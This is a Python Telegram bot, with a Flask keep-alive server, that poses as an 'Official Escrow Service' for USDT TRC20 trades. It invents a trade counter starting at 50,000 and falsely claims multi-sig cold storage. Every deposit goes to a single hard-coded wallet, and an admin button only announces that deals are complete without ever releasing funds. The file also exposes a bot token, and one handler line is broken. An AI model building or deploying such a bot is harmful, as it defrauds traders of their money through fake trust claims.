import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask

app = Flask(__name__)

@app.route('/')
def home():
    return "Mubarak ho! Escrow Bot 24/7 zinda hai!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

TOKEN = "8531797665:AAHziX3gFuQ3S6pq3Ua9noa_iLE1w5__pqo"
ADMIN_ID = "6327316551" 
DEPOSIT_ADDRESS = "THwDdNB5sb449DATzUjwyx9gEHXkS45ewc"

bot = telebot.TeleBot(TOKEN)
user_data = {} 

# Dynamic Trade Counter file management
COUNTER_FILE = "trade_counter.txt"

def get_total_trades():
    if os.path.exists(COUNTER_FILE):
        with open(COUNTER_FILE, "r") as f:
            try:
                return int(f.read().strip())
            except:
                return 50000
    else:
        return 50000

def increment_trades():
    current = get_total_trades() + 1
    with open(COUNTER_FILE, "w") as f:
        f.write(str(current))
    return current

@app.message_handler(commands=['start']) # Note: handled via bot handlers below
def dummy():
    pass

@bot.message_handler(commands=['start'])
def start(message):
    total_trades = get_total_trades()
    welcome_text = (
        f"🛡 **Welcome to Official Escrow Service, {message.from_user.first_name}!**\n\n"
        f"The most trusted and secure platform for buyers and sellers worldwide. "
        f"We protect your funds until all trade terms are 100% fulfilled.\n\n"
        f"📊 **Successful Trades Completed:** `{total_trades}+`\n\n"
        f"👇 **Please select an option below to get started:**"
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🤝 Create New Deal", callback_data="create_deal"))
    markup.add(InlineKeyboardButton("💰 Deposit Funds (Crypto)", callback_data="deposit"))
    markup.add(InlineKeyboardButton("📖 Terms & FAQ", callback_data="rules"))
    markup.add(InlineKeyboardButton("📞 Official Support", url="https://t.me/Scurepaymentescrow_Official"))
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "deposit":
        text = (
            f"💰 **Secure Deposit Gateway (USDT - TRC20)**\n\n"
            f"Transfer your funds securely to our official verified escrow address below:\n\n"
            f"`{DEPOSIT_ADDRESS}`\n\n"
            f"⚠️ **Important Notice:** Send ONLY TRC20 network tokens. After completing the transfer, please send the transaction screenshot/receipt here for verification."
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu"))
        bot.edit_message_text(text=text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        
    elif call.data == "create_deal":
        terms_text = (
            "⚖️ **Escrow Terms & Conditions (Agreement)**\n\n"
            "Before proceeding with a secure deal, both parties must acknowledge our core policies:\n\n"
            "1️⃣ **Fund Locking:** Funds sent to our escrow address remain safely locked until both buyer and seller confirm completion.\n"
            "2️⃣ **Service Fee:** A standard **2% transparent fee** is applicable on total trade value upon successful settlement.\n"
            "3️⃣ **Dispute Resolution:** In case of a dispute, our administration team holds the final authority based on valid proofs.\n"
            "4️⃣ **Zero Tolerance for Fraud:** Fake transaction proofs will result in an immediate permanent ban.\n\n"
            "By clicking 'I Agree', you accept all terms and conditions above."
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("✅ I Agree & Proceed", callback_data="agree_terms"))
        markup.add(InlineKeyboardButton("❌ Cancel", callback_data="main_menu"))
        bot.edit_message_text(text=terms_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "agree_terms":
        bot.edit_message_text(
            text="🤝 **Deal Initiated Successfully!**\n\nPlease reply to this chat with the **Counterparty Username** and **Your Role** (e.g., `@username, Buyer` or `@username, Seller`).",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, process_trade_details)

    elif call.data == "rules":
        rules_text = (
            "📖 **Comprehensive Escrow Guidelines & FAQ**\n\n"
            "🔒 **1. 100% Secure Holding:** Funds are kept in isolated offline multi-sig wallets.\n\n"
            "⚖️ **2. Dispute Policy:** Unresolved issues are investigated within 24 hours by senior staff.\n\n"
            "💰 **3. Transparent Pricing:** Only 2% fee deducted upon completion. No hidden charges.\n\n"
            "🚫 **4. Security Warning:** Staff will never message you first for funds. Always verify official usernames."
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu"))
        bot.edit_message_text(text=rules_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "main_menu":
        start(call.message)

    # ADMIN APPROVAL CALLBACK HANDLER
    elif call.data.startswith("approve_"):
        user_chat_id = call.data.split("_")[1]
        new_total = increment_trades()
        
        # Notify Admin that it's completed
        bot.answer_callback_query(call.id, "✅ Trade Approved & Completed Successfully!")
        bot.edit_message_caption(
            caption=call.message.caption + f"\n\n🟢 **STATUS: APPROVED & COMPLETED** (Total Trades now: {new_total})",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )
        
        # Notify User that deal is complete with Satisfied buttons
        user_markup = InlineKeyboardMarkup()
        user_markup.add(InlineKeyboardButton("⭐ Satisfied / Rate Us", url="https://t.me/Scurepaymentescrow_Official"))
        user_markup.add(InlineKeyboardButton("🔄 Start New Deal", callback_data="create_deal"))
        
        completion_msg = (
            "🎉 **CONGRATULATIONS! DEAL COMPLETED SUCCESSFULLY** 🎉\n\n"
            "Your payment has been verified by administration, terms are fulfilled, and the trade is now closed safely.\n"
            "Thank you for choosing our Official Escrow Service!"
        )
        try:
            bot.send_message(user_chat_id, completion_msg, reply_markup=user_markup, parse_mode="Markdown")
        except Exception as e:
            pass

@bot.message_handler(commands=['trade'])
def trade_command(message):
    terms_text = (
        "⚖️ **Escrow Terms & Conditions (Agreement)**\n\n"
        "1️⃣ **Fund Security:** Funds are securely held until terms are met.\n"
        "2️⃣ **Platform Fee:** A standard **2% fee** applies upon completion.\n"
        "3️⃣ **Disputes:** Admin decision is final in conflicts.\n\n"
        "Click below to agree and start your trade:"
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ I Agree & Proceed", callback_data="agree_terms"))
    bot.send_message(message.chat.id, terms_text, reply_markup=markup, parse_mode="Markdown")

def process_trade_details(message):
    user_data[message.chat.id] = {'counterparty_details': message.text}
    
    payment_instructions = (
        "✅ **Trade Parameters Registered!**\n\n"
        "💳 **Official Escrow Deposit Address:**\n"
        f"`{DEPOSIT_ADDRESS}`\n\n"
        "*(Network: USDT TRC20 Only)*\n\n"
        "⚠️ **Fee Reminder:** A standard **2% fee** will be deducted upon successful trade execution.\n\n"
        "📸 **Final Step:** Transfer the exact amount to the address above and send the **Payment Screenshot / Receipt** right here in chat."
    )
    bot.send_message(message.chat.id, payment_instructions, parse_mode="Markdown")

@bot.message_handler(content_types=['photo', 'document'])
def handle_docs_photo(message):
    chat_id = message.chat.id
    user = message.from_user
    username = f"@{user.username}" if user.username else "No Username"
    user_id = user.id
    
    data = user_data.get(chat_id, {})
    counterparty = data.get('counterparty_details', 'Not Provided ❌')
    
    bot.send_message(chat_id, "✅ **Proof Received Successfully!**\nYour payment proof has been securely forwarded to our verification department. Please wait, an admin will review and verify shortly.")
    
    admin_notification = (
        f"🚨 **NEW ESCROW PAYMENT PROOF SUBMITTED!** 🚨\n\n"
        f"👤 **Client Name:** {user.first_name} ({username})\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"🤝 **Trade Details / Role:** {counterparty}\n\n"
        f"📌 *Verify blockchain hash before clicking approve below:*"
    )
    
    # Add an Approve button for Admin
    admin_markup = InlineKeyboardMarkup()
    admin_markup.add(InlineKeyboardButton("✅ Approve & Complete Deal", callback_data=f"approve_{chat_id}"))
    
    try:
        # Forward or send photo with caption to admin
        bot.send_photo(
            ADMIN_ID, 
            message.photo[-1].file_id, 
            caption=admin_notification, 
            reply_markup=admin_markup, 
            parse_mode='Markdown'
        )
    except Exception as e:
        try:
            bot.send_message(ADMIN_ID, admin_notification + "\n\n(Document attached below)", parse_mode='Markdown')
            bot.forward_message(ADMIN_ID, chat_id, message.message_id)
        except Exception as ex:
            bot.send_message(chat_id, "⚠️ Notice: Notification transmission error to administration.")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    bot.send_message(message.chat.id, "Please type /start or /trade to initiate a secure transaction.")

if __name__ == '__main__':
    threading.Thread(target=run_web, daemon=True).start()
    print("Escrow Bot successfully running...")
    bot.infinity_polling()
            
